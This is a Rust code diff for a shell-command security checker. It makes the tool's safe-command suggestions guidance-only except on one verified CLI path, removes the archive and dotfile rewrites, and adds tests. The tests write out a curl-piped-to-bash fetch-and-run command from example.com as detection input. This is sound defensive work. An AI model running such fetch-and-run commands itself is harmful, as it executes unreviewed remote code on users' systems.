@@ -2,9 +2,12 @@
 //!
 //! The engine behind `tirith check --suggest-safe-command`. Purely advisory
 //! (never influences detection, verdicts, or exit codes): it inspects a
-//! computed [`Verdict`] plus the command and proposes transformations. Every
-//! public suggestion constructor composes compatible transformations and
-//! re-analyzes the exact final command under the original analysis context. A
+//! computed [`Verdict`] plus the command and proposes transformations. Generic
+//! suggestion constructors are deliberately guidance-only because they do not
+//! own the complete execution provenance. The one executable boundary,
+//! [`suggest_verified_for_cli_inline_with_policy_and_session`], is reserved for
+//! the CLI's inline `check`/`fix` path and requires its frozen policy, session,
+//! and analysis context; it resolves and stamps the CLI origin internally. A
 //! wrong suggestion is worse than none: a partial transformation remains
 //! guidance-only and never crosses the executable field boundary.
 //!
@@ -12,7 +15,7 @@
 //!
 //! Mechanical candidates require whole-command effective verification before
 //! executable use. Pipe-to-shell delegates to hardened `tirith run --capsule`;
-//! archive/dotfile rewrites retain narrow modeled shapes. TLS, HTTP, typosquat,
+//! archive/dotfile findings are guidance-only. TLS, HTTP, typosquat,
 //! sudo, and environment findings are guidance-only because shell/tool option
 //! semantics cannot be safely reconstructed from the current token model.
 
@@ -24,7 +27,9 @@ use crate::engine::{self, AnalysisContext};
 use crate::extract::ScanContext;
 use crate::policy::Policy;
 use crate::tokenize::{self, ShellType};
-use crate::verdict::{Action, Finding, RuleId, Severity, Verdict};
+#[cfg(test)]
+use crate::verdict::Severity;
+use crate::verdict::{Action, Finding, RuleId, Verdict};
 
 /// A single safe-command suggestion tied to one finding. Multi-step rewrites
 /// live in [`Self::safe_command`] with steps joined by ` && `.
@@ -65,17 +70,18 @@ pub fn sensitive_env_vars() -> &'static [&'static str] {
     &SENSITIVE_ENV_VARS
 }
 
-/// Build verified safe-command suggestions in a default non-interactive Exec
-/// context, one [`SafeSuggestion`] per rule id (deduplicated).
+/// Build guidance-only safe-command suggestions in a default non-interactive
+/// Exec context, one [`SafeSuggestion`] per rule id (deduplicated).
 ///
 /// Two command-shape transforms (`sudo_narrow`, `env_scrub`) also run once per
 /// verdict, keyed on the command shape / process env rather than a [`RuleId`].
 /// The constructed context has no cwd/card/clipboard metadata; callers that own
-/// those values should use [`suggest_verified_with_policy`]. Empty when the
-/// verdict has no findings.
+/// those values should use [`suggest_verified_with_policy`]. This compatibility
+/// API never populates [`SafeSuggestion::safe_command`]. Empty when the verdict
+/// has no findings.
 pub fn suggest(cmd: &str, shell: ShellType, verdict: &Verdict) -> Vec<SafeSuggestion> {
     let ctx = default_exec_context(cmd, shell);
-    suggest_verified(&ctx, verdict)
+    guidance_only_candidates(&ctx, verdict, None)
 }
 
 fn default_exec_context(cmd: &str, shell: ShellType) -> AnalysisContext {
@@ -95,60 +101,128 @@ fn default_exec_context(cmd: &str, shell: ShellType) -> AnalysisContext {
     }
 }
 
-/// Build suggestions safe to expose through an executable stdout/eval/JSON
-/// contract.
+/// Build guidance-only suggestions for callers that do not own the exact policy
+/// and session used for the verdict.
 ///
-/// This convenience entry point discovers the original input's policy once,
-/// then delegates to [`suggest_verified_with_policy`]. Enforcement callers that
-/// already analyzed the original input should pass that exact returned policy
-/// snapshot to the latter function instead of discovering it again.
+/// This compatibility entry point does not rediscover policy and never
+/// populates [`SafeSuggestion::safe_command`].
 pub fn suggest_verified(ctx: &AnalysisContext, verdict: &Verdict) -> Vec<SafeSuggestion> {
-    if verdict.findings.is_empty() {
-        return Vec::new();
-    }
-    let policy = engine::analyze_without_bypass_returning_policy(ctx).1;
-    suggest_verified_with_policy(ctx, verdict, &policy)
+    guidance_only_candidates(ctx, verdict, None)
 }
 
-/// Build suggestions safe to expose through an executable stdout/eval/JSON
-/// contract, bound to the exact policy snapshot used for the original verdict.
+/// Build guidance-only suggestions bound to a supplied policy snapshot.
 ///
-/// Every mechanical candidate is re-analyzed byte-for-byte with the original
-/// shell, scan context, cwd, and policy object. Compatible transformations are
-/// composed with a bounded breadth-first search. Only the shortest final
-/// command whose effective action is [`Action::Allow`] and has no pending
-/// approval remains in a `safe_command` field.
-/// All other transformations are retained as static guidance, with their
-/// candidate command removed from structured output.
+/// A frozen policy alone is not complete execution provenance, so this generic
+/// API never populates [`SafeSuggestion::safe_command`].
 pub fn suggest_verified_with_policy(
     ctx: &AnalysisContext,
     verdict: &Verdict,
     policy: &Policy,
 ) -> Vec<SafeSuggestion> {
-    let session_id = crate::session::resolve_session_id();
-    suggest_verified_with_policy_and_session(ctx, verdict, policy, &session_id)
+    guidance_only_candidates(ctx, verdict, Some(policy))
 }
 
-/// Session-bound variant used by enforcement callers that already resolved the
-/// current session. Candidate verification is read-only, but observes the same
-/// escalation/correlation history as the original verdict.
+/// Build guidance-only suggestions bound to a supplied policy and session.
+///
+/// Even with those values, a generic caller has not established that the
+/// verdict came from Tirith's CLI-inline analysis path. This compatibility API
+/// therefore never populates [`SafeSuggestion::safe_command`].
 pub fn suggest_verified_with_policy_and_session(
     ctx: &AnalysisContext,
     verdict: &Verdict,
     policy: &Policy,
+    _session_id: &str,
+) -> Vec<SafeSuggestion> {
+    guidance_only_candidates(ctx, verdict, Some(policy))
+}
+
+/// Build executable suggestions for Tirith's exact CLI-inline `check`/`fix`
+/// path.
+///
+/// This boundary accepts no caller-supplied verdict or origin. It performs the
+/// original analysis itself under the supplied frozen policy, applies the CLI's
+/// Inline runtime enrichment, stamps the locally resolved CLI origin, and runs
+/// read-only effective post-processing under the supplied session. Candidate
+/// commands repeat that same producer-owned pipeline with the same origin.
+/// Only an approval-free effective [`Action::Allow`] may populate
+/// `safe_command`.
+pub fn suggest_verified_for_cli_inline_with_policy_and_session(
+    ctx: &AnalysisContext,
+    policy: &Policy,
     session_id: &str,
 ) -> Vec<SafeSuggestion> {
     let trusted_runner = trusted_current_tirith_path();
-    suggest_verified_with_policy_and_runner(
+    suggest_verified_for_cli_inline_with_policy_session_and_runner(
         ctx,
-        verdict,
         policy,
-        trusted_runner.as_deref(),
         session_id,
+        trusted_runner.as_deref(),
     )
 }
 
-fn suggest_verified_with_policy_and_runner(
+/// Producer-owned exact seam used by the public CLI API and by Linux tests that
+/// inject a fixed Tirith path. Callers cannot supply either the original verdict
+/// or its origin: both are derived here before candidate generation begins.
+fn suggest_verified_for_cli_inline_with_policy_session_and_runner(
+    ctx: &AnalysisContext,
+    policy: &Policy,
+    session_id: &str,
+    trusted_runner: Option<&Path>,
+) -> Vec<SafeSuggestion> {
+    let origin = crate::agent_origin::resolve_cli_origin(ctx.interactive);
+    let verdict = analyze_cli_inline_candidate(ctx, &origin, policy, session_id);
+    verify_cli_inline_suggestions_with_runner(ctx, &verdict, policy, trusted_runner, session_id)
+}
+
+fn analyze_cli_inline_candidate(
+    ctx: &AnalysisContext,
+    origin: &crate::agent_origin::AgentOrigin,
+    policy: &Policy,
+    session_id: &str,
+) -> Verdict {
+    let mut raw = engine::analyze_with_policy_without_bypass(ctx, policy);
+    let runtime_findings = crate::threatdb_api::enrich_command(
+        &ctx.input,
+        ctx.shell,
+        &policy.threat_intel,
+        crate::threatdb_api::RuntimeThreatMode::Inline,
+    );
+    if !runtime_findings.is_empty() {
+        raw.findings.extend(runtime_findings);
+        raw.action = crate::verdict::upgraded_action_from_findings(&raw.findings, raw.action);
+    }
+    raw.agent_origin = Some(origin.clone());
+    crate::escalation::post_process_verdict_for_verification(
+        &raw,
+        policy,
+        &ctx.input,
+        session_id,
+        crate::escalation::CallerContext::Cli,
+    )
+}
+
+fn guidance_only_candidates(
+    ctx: &AnalysisContext,
+    verdict: &Verdict,
+    policy: Option<&Policy>,
+) -> Vec<SafeSuggestion> {
+    let mut suggestions = suggest_candidates_with_runner(ctx, verdict, policy, None);
+    strip_executable_candidates(
+        &mut suggestions,
+        " The mechanical transformation is guidance-only because this API does not own the complete CLI-inline execution provenance.",
+    );
+    suggestions
+}
+
+fn strip_executable_candidates(suggestions: &mut [SafeSuggestion], reason: &str) {
+    for suggestion in suggestions {
+        if suggestion.safe_command.take().is_some() {
+            suggestion.rationale.push_str(reason);
+        }
+    }
+}
+
+fn verify_cli_inline_suggestions_with_runner(
     ctx: &AnalysisContext,
     verdict: &Verdict,
     policy: &Policy,
@@ -157,6 +231,27 @@ fn suggest_verified_with_policy_and_runner(
 ) -> Vec<SafeSuggestion> {
     let mut suggestions =
         suggest_candidates_with_runner(ctx, verdict, Some(policy), trusted_runner);
+    if ctx.scan_context != ScanContext::Exec || ctx.raw_bytes.is_some() || ctx.file_path.is_some() {
+        strip_executable_candidates(
+            &mut suggestions,
+            " The mechanical transformation is guidance-only because executable suggestions require the CLI's exact command-analysis context.",
+        );
+        return suggestions;
+    }
+    if verdict.requires_approval == Some(true) {
+        strip_executable_candidates(
+            &mut suggestions,
+            " The mechanical transformation is guidance-only while approval remains required for the original command.",
+        );
+        return suggestions;
+    }
+    let Some(candidate_origin) = verdict.agent_origin.clone() else {
+        strip_executable_candidates(
+            &mut suggestions,
+            " The mechanical transformation is guidance-only because the effective CLI-inline verdict has no stamped agent origin.",
+        );
+        return suggestions;
+    };
     let initial_candidates: Vec<(String, String)> = suggestions
         .iter()
         .filter_map(|suggestion| {
@@ -193,10 +288,6 @@ fn suggest_verified_with_policy_and_runner(
         }
     }
 
-    let candidate_origin = verdict
-        .agent_origin
-        .clone()
-        .unwrap_or_else(|| crate::agent_origin::resolve_cli_origin(ctx.interactive));
     let mut examined = 0usize;
     let mut verified: Option<Candidate> = None;
     while let Some(candidate) = queue.pop_front() {
@@ -206,31 +297,11 @@ fn suggest_verified_with_policy_and_runner(
         examined += 1;
 
         let candidate_ctx = context_with_input(ctx, candidate.command.clone());
-        // Never let a process/inline bypass or a policy-file race bless an
-        // executable suggestion. Every candidate uses the original resolved
-        // policy object; no policy discovery occurs in this loop.
-        let mut candidate_raw = engine::analyze_with_policy_without_bypass(&candidate_ctx, policy);
-        let runtime_findings = crate::threatdb_api::enrich_command(
-            &candidate.command,
-            candidate_ctx.shell,
-            &policy.threat_intel,
-            crate::threatdb_api::RuntimeThreatMode::Inline,
-        );
-        if !runtime_findings.is_empty() {
-            candidate_raw.findings.extend(runtime_findings);
-            candidate_raw.action = crate::verdict::upgraded_action_from_findings(
-                &candidate_raw.findings,
-                candidate_raw.action,
-            );
-        }
-        candidate_raw.agent_origin = Some(candidate_origin.clone());
-        let candidate_verdict = crate::escalation::post_process_verdict_for_verification(
-            &candidate_raw,
-            policy,
-            &candidate.command,
-            session_id,
-            crate::escalation::CallerContext::Cli,
-        );
+        // Repeat the same producer-owned CLI-inline pipeline used to analyze the
+        // original command. No caller-supplied verdict or generic daemon mode can
+        // cross this executable-output boundary.
+        let candidate_verdict =
+            analyze_cli_inline_candidate(&candidate_ctx, &candidate_origin, policy, session_id);
         if candidate_verdict.action == Action::Allow
             && candidate_verdict.requires_approval != Some(true)
         {
@@ -266,13 +337,10 @@ fn suggest_verified_with_policy_and_runner(
     // A transformation that was not the exact Allow result is guidance, not an
     // executable command. Do not leak the partial command into the structured
     // contract; human renderers can safely show the static rationale/remediation.
-    for suggestion in &mut suggestions {
-        if suggestion.safe_command.take().is_some() {
-            suggestion.rationale.push_str(
-                " The mechanical transformation is guidance-only because the exact resulting command did not independently re-analyze to Allow.",
-            );
-        }
-    }
+    strip_executable_candidates(
+        &mut suggestions,
+        " The mechanical transformation is guidance-only because the exact resulting command did not independently re-analyze to Allow.",
+    );
 
     if let Some(verified) = verified {
         let anchor_rule = verified.rule_path.first().cloned().unwrap_or_default();
@@ -365,7 +433,7 @@ fn suggest_candidates_with_runner(
 }
 
 fn build_suggestion(
-    cmd: &str,
+    _cmd: &str,
     shell: ShellType,
     segments: &[tokenize::Segment],
     finding: &Finding,
@@ -420,34 +488,20 @@ fn build_suggestion(
              makes an automatic operand substitution unsafe."
                 .to_string(),
         ),
-        RuleId::ArchiveExtract => match rewrite_archive_list_first(segments, shell) {
-            Some(rewrite) => (
-                Some(rewrite),
-                "Lists the archive contents first so path-traversal entries (e.g. \
-                 `../../etc/passwd`) are visible before any file is written to disk."
-                    .to_string(),
-            ),
-            None => (
-                None,
-                "Inspect the archive contents (e.g. `tar -tzf <archive>`) before \
-                 extracting to a sensitive path."
-                    .to_string(),
-            ),
-        },
-        RuleId::DotfileOverwrite => match rewrite_dotfile_backup_first(cmd, segments, shell) {
-            Some(rewrite) => (
-                Some(rewrite),
-                "Backs up the existing dotfile before the redirect modifies it, so \
-                 the previous configuration can be restored if the change breaks login."
-                    .to_string(),
-            ),
-            None => (
-                None,
-                "Back up the target dotfile (`cp <file> <file>.bak`) before \
-                 redirecting output into it."
-                    .to_string(),
-            ),
-        },
+        RuleId::ArchiveExtract => (
+            None,
+            "Inspect every archive entry and validate normalized extraction paths before \
+             extracting. A preview followed by the original extract is still unsafe and \
+             is guidance-only; it cannot be emitted as an executable rewrite."
+                .to_string(),
+        ),
+        RuleId::DotfileOverwrite => (
+            None,
+            "Review the exact target and intended content, then make a verified backup before \
+             changing the dotfile. Backup-then-original still performs the flagged overwrite \
+             and is guidance-only; it cannot be emitted as an executable rewrite."
+                .to_string(),
+        ),
         // Every other rule: no safe mechanical rewrite — remediation guides.
         _ => (
             None,
@@ -560,16 +614,21 @@ fn rewrite_pipe_to_shell(
 fn trusted_current_tirith_path() -> Option<std::path::PathBuf> {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     {
-        crate::trusted_child::TrustedExecutable::current()
+        let executable = crate::trusted_child::TrustedExecutable::current()
             .ok()?
             .require_safe_reinvocation_provenance()
-            .ok()
-            .map(|executable| executable.path().to_path_buf())
+            .ok()?;
+        is_tirith_runner_path(executable.path()).then(|| executable.path().to_path_buf())
     }
     #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
     {
         None
     }
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+fn is_tirith_runner_path(path: &Path) -> bool {
+    path.file_name() == Some(std::ffi::OsStr::new("tirith"))
 }
 
 /// Encode one already-decoded argument and prove the selected shell decoder
@@ -912,185 +971,6 @@ fn supported_fetch_url(command: &str, args: &[String]) -> Option<String> {
     Some(url)
 }
 
-// ── Typosquat rewrite ───────────────────────────────────────────────────────
-
-// ── Archive list-before-extract ────────────────────────────────────────────
-
-/// Archive command names recognized by the `ArchiveExtract` rule.
-fn archive_command_kind(cmd: &str) -> Option<&'static str> {
-    match cmd {
-        "tar" => Some("tar"),
-        "unzip" => Some("unzip"),
-        "7z" => Some("7z"),
-        _ => None,
-    }
-}
-
-/// Find the archive filename in an extract command's args. For `tar` it's the
-/// first non-flag arg after `-f`/`--file` (incl. combined `-xzf <file>`); for
-/// `unzip` the first non-flag arg; for `7z` the first non-flag arg after the verb.
-fn find_archive_arg(args: &[String], kind: &str) -> Option<String> {
-    let mut i = 0;
-    while i < args.len() {
-        let arg = strip_quotes(&args[i]);
-        if arg == "-f" || arg == "--file" {
-            if let Some(next) = args.get(i + 1) {
-                let v = strip_quotes(next);
-                if !v.starts_with('-') {
-                    return Some(v);
-                }
-            }
-        }
-        if let Some(rest) = arg.strip_prefix("--file=") {
-            return Some(rest.to_string());
-        }
-        // Combined short form `-xzf` / `-tzf` — `-f` is the trailing letter.
-        if arg.starts_with('-')
-            && !arg.starts_with("--")
-            && arg.len() > 2
-            && arg.ends_with('f')
-            && arg[1..].chars().all(|c| c.is_ascii_alphanumeric())
-        {
-            if let Some(next) = args.get(i + 1) {
-                let v = strip_quotes(next);
-                if !v.starts_with('-') {
-                    return Some(v);
-                }
-            }
-        }
-        i += 1;
-    }
-
-    // For unzip / 7z: take the first non-flag positional (skipping the verb for 7z).
-    match kind {
-        "unzip" => args
-            .iter()
-            .map(|a| strip_quotes(a))
-            .find(|a| !a.starts_with('-') && !a.is_empty()),
-        "7z" => {
-            let mut it = args.iter().map(|a| strip_quotes(a));
-            // Skip the verb (`x`, `e`, …).
-            let _verb = it.find(|a| !a.starts_with('-') && !a.is_empty())?;
-            it.find(|a| !a.starts_with('-') && !a.is_empty())
-        }
-        _ => None,
-    }
-}
-
-/// Build the preview-then-extract rewrite for a flagged archive command. `None`
-/// when multi-segment, the leader isn't `tar`/`unzip`/`7z`, or no archive arg.
-fn rewrite_archive_list_first(segments: &[tokenize::Segment], shell: ShellType) -> Option<String> {
-    if segments.len() != 1 {
-        return None;
-    }
-    let seg = &segments[0];
-    let cmd = base_command(seg.command.as_deref()?, shell);
-    let kind = archive_command_kind(&cmd)?;
-    let archive = find_archive_arg(&seg.args, kind)?;
-    let archive = sanitize_for_display(&archive);
-    if archive.is_empty() {
-        return None;
-    }
-    // Single-quote ONLY the untrusted archive path on the preview half; the
-    // `{raw}` tail is the user's own original command, re-emitted verbatim, and
-    // must NOT be re-quoted (that would corrupt its existing flags/quoting).
-    let archive = shell_single_quote(&archive)?;
-    let raw = seg.raw.trim();
-    // `tar -tf` (no compression flag) auto-detects compression on modern GNU &
-    // BSD tar; hard-coding `-tzf` (gzip) would break non-gzip variants.
-    Some(match kind {
-        "tar" => format!("tar -tf {archive} | head && {raw}"),
-        "unzip" => format!("unzip -l {archive} | head && {raw}"),
-        "7z" => format!("7z l {archive} | head && {raw}"),
-        _ => return None,
-    })
-}
-
-// ── Dotfile backup-first redirect ──────────────────────────────────────────
-
-/// Extract the redirect target from a `> ~/.<file>` / `>> $HOME/.<file>` shape,
-/// returning the literal token as written.
-fn dotfile_redirect_target(cmd: &str) -> Option<String> {
-    let bytes = cmd.as_bytes();
-    let mut i = 0;
-    while i < bytes.len() {
-        if bytes[i] != b'>' {
-            i += 1;
-            continue;
-        }
-        let mut j = i + 1;
-        if j < bytes.len() && bytes[j] == b'>' {
-            j += 1;
-        }
-        while j < bytes.len() && bytes[j].is_ascii_whitespace() {
-            j += 1;
-        }
-        let rest = &cmd[j..];
-        let prefixes = ["~/.", "$HOME/."];
-        for prefix in &prefixes {
-            if rest.starts_with(prefix) {
-                let end = rest
-                    .find(|c: char| c.is_ascii_whitespace() || c == ';' || c == '|' || c == '&')
-                    .unwrap_or(rest.len());
-                let token = &rest[..end];
-                if !token.is_empty() {
-                    return Some(token.to_string());
-                }
-            }
-        }
-        i = j;
-    }
-    None
-}
-
-/// Expand `~/...` and `$HOME/...` to an absolute filesystem path for the
-/// dotfile existence check.
-fn expand_dotfile_to_fs_path(token: &str) -> Option<std::path::PathBuf> {
-    let home = std::env::var_os("HOME")?;
-    let home = std::path::PathBuf::from(home);
-    if let Some(rest) = token.strip_prefix("~/") {
-        return Some(home.join(rest));
-    }
-    if let Some(rest) = token.strip_prefix("$HOME/") {
-        return Some(home.join(rest));
-    }
-    None
-}
-
-/// Build the backup-then-redirect rewrite for a dotfile-overwrite command. Only
-/// fires when the target dotfile exists (backing up a missing file just errors).
-fn rewrite_dotfile_backup_first(
-    cmd: &str,
-    segments: &[tokenize::Segment],
-    _shell: ShellType,
-) -> Option<String> {
-    if segments.len() != 1 {
-        return None;
-    }
-    let target_token = dotfile_redirect_target(cmd)?;
-    let fs_path = expand_dotfile_to_fs_path(&target_token)?;
-    if !Path::new(&fs_path).exists() {
-        return None;
-    }
-    let target_token = sanitize_for_display(&target_token);
-    if target_token.is_empty() {
-        return None;
-    }
-    // The token is `~/.…` or `$HOME/.…` and MUST stay unquoted so the shell
-    // still expands `~` / `$HOME` in the generated `cp` (single-quoting it would
-    // create a literal `~`/`$HOME` directory). We therefore can't neutralize an
-    // injected `$( )` / backtick by quoting — instead refuse the rewrite unless
-    // the path after the prefix is plain path characters. The `{cmd}` tail is
-    // the user's own original command, re-emitted verbatim (not re-quoted).
-    if !dotfile_redirect_token_is_safe(&target_token) {
-        return None;
-    }
-    Some(format!(
-        "cp {target_token} {target_token}.bak && {cmd}",
-        cmd = cmd.trim()
-    ))
-}
-
 // ── Sudo narrow (command-shape based) ──────────────────────────────────────
 
 /// Sudo rewrites are guidance-only. Removing `sudo` changes command lookup
@@ -1124,75 +1004,6 @@ fn build_sudo_narrow_suggestion(
 
 // ── Env scrub (command-shape based) ────────────────────────────────────────
 
-/// `true` when `cmd` is a single simple command that `env -u VAR … <cmd>` can
-/// safely wrap. `env -u` only scrubs the immediately-following process — any
-/// compound construct (`|`, `&&`/`||`, `;`, redirections, `&`, `` ` ``/`$(`,
-/// subshells) spawns children that inherit the caller's env, so wrapping it
-/// would leak the secret through later stages.
-///
-/// Scans byte-by-byte tracking quote/escape state: single quotes make contents
-/// literal; in double quotes only `$`/`` ` ``/`\` retain meaning, so command
-/// substitution (`` ` ``, `$(`) is flagged outside single quotes only.
-#[cfg(test)]
-fn is_simple_command_for_env_scrub(cmd: &str) -> bool {
-    // Both quote flags can't be true at once — POSIX doesn't nest the two.
-    let mut in_single = false;
-    let mut in_double = false;
-    let mut escape = false;
-
-    let bytes = cmd.as_bytes();
-    let mut i = 0;
-    while i < bytes.len() {
-        let b = bytes[i];
-
-        // Backslash outside single quotes consumes the next byte verbatim;
-        // inside single quotes it's literal (POSIX has no escape there).
-        if escape {
-            escape = false;
-            i += 1;
-            continue;
-        }
-        if b == b'\\' && !in_single {
-            escape = true;
-            i += 1;
-            continue;
-        }
-
-        if in_single {
-            if b == b'\'' {
-                in_single = false;
-            }
-            i += 1;
-            continue;
-        }
-        if in_double {
-            match b {
-                b'"' => in_double = false,
-                // Command substitution is active even inside double quotes.
-                b'`' => return false,
-                b'$' => return false,
-                _ => {}
-            }
-            i += 1;
-            continue;
-        }
-
-        // Unquoted — flag any shell-compound metacharacter.
-        match b {
-            b'\'' => in_single = true,
-            b'"' => in_double = true,
-            b'|' | b'&' | b';' | b'>' | b'<' | b'(' | b')' | b'`' | b'\n' | b'\r' => return false,
-            b'$' => return false,
-            _ => {}
-        }
-        i += 1;
-    }
-
-    // Unterminated quotes / trailing backslash — not-simple; a malformed
-    // command is exactly where guessing the wrapper is most dangerous.
-    !(in_single || in_double || escape)
-}
-
 /// Build guidance for scrubbing sensitive environment variables. This is never
 /// an executable rewrite: a parent shell expands `$VAR` before `env` runs,
 /// `env -u` is not portable across Tirith's supported shells, policy-controlled
@@ -1205,17 +1016,14 @@ fn build_env_scrub_suggestion(
     _cwd: Option<&str>,
     _policy: Option<&Policy>,
 ) -> Option<SafeSuggestion> {
-    // Fire on the dedicated M9 ch4 rule (explicit, audit-visible) OR any
-    // High-severity finding (M6 ch5 compat heuristic).
+    // Fire only on the dedicated, audit-visible exposure rule. Severity alone
+    // says nothing about environment inheritance; treating every High finding
+    // as an env leak produced unrelated and misleading guidance.
     let dedicated_rule_present = verdict
         .findings
         .iter()
         .any(|f| f.rule_id == RuleId::EnvSensitiveExposedToUnknownScript);
-    let any_high = verdict
-        .findings
-        .iter()
-        .any(|f| f.severity >= Severity::High);
-    if !dedicated_rule_present && !any_high {
+    if !dedicated_rule_present {
         return None;
     }
 
@@ -1277,12 +1085,6 @@ fn starts_with_http(s: &str) -> bool {
         || (b.len() >= 7 && b[..7].eq_ignore_ascii_case(b"http://"))
 }
 
-/// Strip ASCII control characters so a rewritten command echoed to the terminal
-/// cannot smuggle ANSI escapes or newlines from a hostile URL.
-fn sanitize_for_display(s: &str) -> String {
-    s.chars().filter(|c| !c.is_ascii_control()).collect()
-}
-
 /// Wrap an untrusted token in single quotes for safe interpolation into a
 /// generated shell command, escaping each embedded `'` as `'\''`
 /// (`foo'bar` → `'foo'\''bar'`). Single quotes make every other byte literal,
@@ -1317,37 +1119,15 @@ pub fn shell_single_quote(s: &str) -> Option<String> {
     Some(out)
 }
 
-/// Validate a `~`/`$HOME`-prefixed dotfile redirect token for safe *unquoted*
-/// interpolation. These tokens must stay unquoted so the shell still expands
-/// `~` / `$HOME`, so we cannot single-quote them; instead we require the path
-/// *after* the leading `~/` or `$HOME/` to contain only ordinary path
-/// characters. Anything else (`$`, backtick, `(`, glob, redirection, …) in the
-/// remainder is an injection or glob attempt, and the caller refuses the
-/// rewrite. The extractor already bars whitespace / `;` / `|` / `&`, so this is
-/// belt-and-suspenders against `$(…)`, backticks, globs, and stray redirections.
-fn dotfile_redirect_token_is_safe(token: &str) -> bool {
-    let remainder = token
-        .strip_prefix("~/")
-        .or_else(|| token.strip_prefix("$HOME/"));
-    let Some(remainder) = remainder else {
-        // Unexpected shape (the extractor only emits these two prefixes); refuse.
-        return false;
-    };
-    // The remainder is a plain relative path: filename chars plus `/`.
-    !remainder.is_empty()
-        && remainder
-            .chars()
-            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '/' | '+' | '@'))
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
     use crate::verdict::{Evidence, Timings};
 
     // Transformation-shape unit tests intentionally exercise the private raw
-    // candidate layer. Public `suggest` is covered by integration tests and may
-    // only return a command after whole-command verification.
+    // candidate layer with an injected trusted runner. Public compatibility
+    // APIs are guidance-only; the producer-owned CLI-inline seam separately
+    // proves whole-command execution eligibility.
     fn suggest(cmd: &str, shell: ShellType, verdict: &Verdict) -> Vec<SafeSuggestion> {
         let ctx = default_exec_context(cmd, shell);
         suggest_candidates_with_runner(
@@ -1384,6 +1164,153 @@ mod tests {
         Verdict::from_findings(findings, 3, Timings::default())
     }
 
+    #[test]
+    fn executable_candidate_stripping_clears_the_field_and_records_why() {
+        let mut suggestions = vec![SafeSuggestion {
+            rule_id: "synthetic_rewrite".to_string(),
+            safe_command: Some("echo reviewed".to_string()),
+            rationale: "mechanical candidate".to_string(),
+            remediation: "review it".to_string(),
+        }];
+
+        strip_executable_candidates(&mut suggestions, " guidance-only boundary");
+
+        assert!(suggestions[0].safe_command.is_none());
+        assert!(suggestions[0].rationale.contains("guidance-only boundary"));
+    }
+
+    #[test]
+    fn generic_public_apis_are_guidance_only_even_for_a_stamped_verdict() {
+        let ctx = default_exec_context("tar -xzf archive.tar.gz", ShellType::Posix);
+        let mut verdict = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
+        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
+        let policy = Policy::default();
+
+        let cases = [
+            super::suggest(&ctx.input, ctx.shell, &verdict),
+            suggest_verified(&ctx, &verdict),
+            suggest_verified_with_policy(&ctx, &verdict, &policy),
+            suggest_verified_with_policy_and_session(
+                &ctx,
+                &verdict,
+                &policy,
+                "safe-command-generic-guidance",
+            ),
+        ];
+        for suggestions in cases {
+            assert!(!suggestions.is_empty());
+            assert!(
+                suggestions
+                    .iter()
+                    .all(|suggestion| suggestion.safe_command.is_none()),
+                "generic API leaked an executable command: {suggestions:?}"
+            );
+        }
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn internal_exact_path_without_a_stamped_origin_fails_to_guidance_only() {
+        let ctx = default_exec_context(
+            "curl -fsSL https://example.com/install.sh | bash",
+            ShellType::Posix,
+        );
+        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
+        let policy = Policy::default();
+        let runner = Path::new("/usr/local/bin/tirith");
+        let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
+        assert!(
+            raw.iter()
+                .any(|suggestion| suggestion.safe_command.is_some()),
+            "the missing-origin gate must receive a real executable candidate: {raw:?}"
+        );
+        let suggestions = verify_cli_inline_suggestions_with_runner(
+            &ctx,
+            &verdict,
+            &policy,
+            Some(runner),
+            "safe-command-missing-origin",
+        );
+        assert!(!suggestions.is_empty());
+        assert!(suggestions
+            .iter()
+            .all(|suggestion| suggestion.safe_command.is_none()));
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn producer_owned_cli_inline_api_can_emit_a_verified_pipe_runner() {
+        let ctx = default_exec_context(
+            "curl -fsSL https://example.com/install.sh | bash",
+            ShellType::Posix,
+        );
+        let policy = Policy::default();
+        let suggestions = suggest_verified_for_cli_inline_with_policy_session_and_runner(
+            &ctx,
+            &policy,
+            "safe-command-exact-positive",
+            Some(Path::new("/usr/local/bin/tirith")),
+        );
+        assert!(suggestions
+            .iter()
+            .any(|suggestion| suggestion.safe_command.is_some()));
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn non_exec_analysis_context_cannot_emit_an_executable_pipe_runner() {
+        for invalid_context in ["scan_context", "raw_bytes", "file_path"] {
+            let mut ctx = default_exec_context(
+                "curl -fsSL https://example.com/install.sh | bash",
+                ShellType::Posix,
+            );
+            match invalid_context {
+                "scan_context" => ctx.scan_context = ScanContext::Paste,
+                "raw_bytes" => ctx.raw_bytes = Some(ctx.input.as_bytes().to_vec()),
+                "file_path" => ctx.file_path = Some("reviewed-command.txt".into()),
+                _ => unreachable!(),
+            }
+            let policy = Policy::default();
+            let origin = crate::agent_origin::AgentOrigin::human(false);
+            let verdict = analyze_cli_inline_candidate(
+                &ctx,
+                &origin,
+                &policy,
+                "safe-command-context-boundary",
+            );
+            let runner = Path::new("/usr/local/bin/tirith");
+            let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
+            assert!(
+                raw.iter()
+                    .any(|suggestion| suggestion.safe_command.is_some()),
+                "the {invalid_context} gate must receive a real executable candidate: {raw:?}"
+            );
+            let suggestions = verify_cli_inline_suggestions_with_runner(
+                &ctx,
+                &verdict,
+                &policy,
+                Some(runner),
+                "safe-command-context-boundary",
+            );
+            assert!(
+                suggestions
+                    .iter()
+                    .all(|suggestion| suggestion.safe_command.is_none()),
+                "{invalid_context} leaked an executable suggestion: {suggestions:?}"
+            );
+        }
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn delayed_reinvocation_requires_the_tirith_program_name() {
+        assert!(is_tirith_runner_path(Path::new("/usr/local/bin/tirith")));
+        assert!(!is_tirith_runner_path(Path::new("/usr/local/bin/foo")));
+        assert!(!is_tirith_runner_path(Path::new(
+            "/usr/local/bin/tirith.exe"
+        )));
+    }
+
